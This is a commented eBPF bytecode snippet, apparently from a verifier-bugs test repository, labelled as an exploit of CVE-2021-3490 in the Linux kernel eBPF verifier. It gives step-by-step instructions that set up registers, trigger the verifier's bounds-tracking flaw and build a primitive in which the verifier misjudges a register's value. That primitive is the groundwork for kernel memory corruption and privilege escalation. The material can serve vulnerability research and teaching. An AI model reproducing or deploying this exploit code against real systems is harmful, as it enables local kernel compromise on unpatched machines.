// eBPF bytecode exploit of CVE-2021-3490
// Great blog walk through: https://chomp.ie/Blog+Posts/Kernel+Pwning+with+eBPF+-+a+Love+Story
//
// Testing was done on linux kernel version 5.8 (bcf876870b95). To reproduce with the 
// ebpf-verifier-bugs repo add the following lines to the top of bpf_test_1.c
// 
// #define BPF_STACK_REG BPF_REG_10
// #define CONST_REG BPF_REG_6
// #define EXPLOIT_REG BPF_REG_7
// #define UNKOWN_VALUE_REG BPF_REG_8

// We need two registers. 
// CONST_REG = {mask = 0x0; value = 0x100000002}
// EXPLOIT_REG = {mask = 0xFFFFFFFF00000000; value = 0x1}

// Set up CONST_REG
// Op size is 32 bits, so load cannot be performed in one instruction
BPF_MOV64_IMM(CONST_REG, 0x1),
BPF_ALU64_IMM(BPF_LSH, CONST_REG, 32),
BPF_ALU64_IMM(BPF_ADD, CONST_REG, 2),

// Set up EXPLOIT_REG
// We need to have the upper 32 bits of the tnum mask set and the lower 32 bits 
// not set. In other words, the verifier should know the lower 32 bits but not 
// know the upper 32 bits. We can start with a value where all 64 bits are unkown 
// to the verifier (all bits in the tnum mask are set) then & it with 
// 0xFFFFFFFF00000000. The most straightforward way to get a completely unknown 
// value is to load it from an eBPF map.

// LOAD UNKOWN VALUE FROM MAP

// Set up first argument to BPF_FUNC_map_lookup_elem in R1
BPF_LD_MAP_FD(BPF_REG_1, map_fd),

// Set up second argument to BPF_FUNC_map_lookup_elem. Goal is to load an 
// address to the value 0 into R2. Load 0 into R0 and store value of R0 
// at stack_ptr-4.
BPF_MOV64_IMM(BPF_REG_0, 0),
BPF_STX_MEM(BPF_W, BPF_STACK_REG, BPF_REG_0, -4),
BPF_MOV64_REG(BPF_REG_2, BPF_STACK_REG),
BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),

// Call helper function map_lookup_elem.
BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

// If not null read return value from BPF_FUNC_map_lookup_elem
BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
BPF_MOV64_IMM(BPF_REG_0, 1),
BPF_EXIT_INSN(),
BPF_LDX_MEM(BPF_DW, EXPLOIT_REG, BPF_REG_0, 0),
BPF_LDX_MEM(BPF_DW, UNKOWN_VALUE_REG, BPF_REG_0, 0), // Used later for creating primitive

// FINALIZE EXPLOIT_REG

// Create register with value 0xFFFFFFFF00000000
BPF_MOV64_IMM(BPF_REG_2, 0xFFFFFFFF),
BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),

// AND EXPLOIT_REG and R2 so that EXPLOIT_REG has mask = 0xFFFFFFFF00000000 and value = 0x1
BPF_ALU64_REG(BPF_AND, EXPLOIT_REG, BPF_REG_2),
BPF_ALU64_IMM(BPF_ADD, EXPLOIT_REG, 1),

// TRIGGER VULNERABILITY

// Perform `EXPLOIT_REG &= CONST_REG`. Now EXPLOIT_REG: var_off=(0x0; 0x100000000), 
// s32_min_value=1,s32_max_value=0,u32_min_value=1,u32_max_value=0. Notice how the
// min values are larger then the max values
BPF_ALU64_REG(BPF_AND, EXPLOIT_REG, CONST_REG),

// CREATE EXPLOIT PRIMITIVE

BPF_ALU64_IMM(BPF_ADD, EXPLOIT_REG, 1),
BPF_JMP32_IMM(BPF_JLE, UNKOWN_VALUE_REG, 1, 2),
BPF_MOV64_IMM(BPF_REG_0, 1),
BPF_EXIT_INSN(),

// After BPF_ADD the verifier thinks the value of EXPLOIT_REG is 2 however the actual 
// value is 1 var_off=(0x2; 0xffffffff00000000), s32_min_value=2,s32_max_value=2,
// u32_min_value=2,u32_max_value=2
BPF_ALU64_REG(BPF_ADD, EXPLOIT_REG, UNKOWN_VALUE_REG),

// You can now subtract 1 from EXPLOIT_REG to obtain a register that contains 0 but the 
// verifier thinks contains 1. Then use EXPLOIT_REG to divide by zero

// To create a register the verifier thinks contains 0 but actually contains 1
BPF_MOV32_REG(EXPLOIT_REG, EXPLOIT_REG),
BPF_ALU64_IMM(BPF_AND, EXPLOIT_REG, 1),

// THE VERIFIER NOW THINKS EXPLOIT_REG IS 0 WHEN IT IS REALLY 1

BPF_MOV64_IMM(BPF_REG_0, 1),
BPF_EXIT_INSN(),
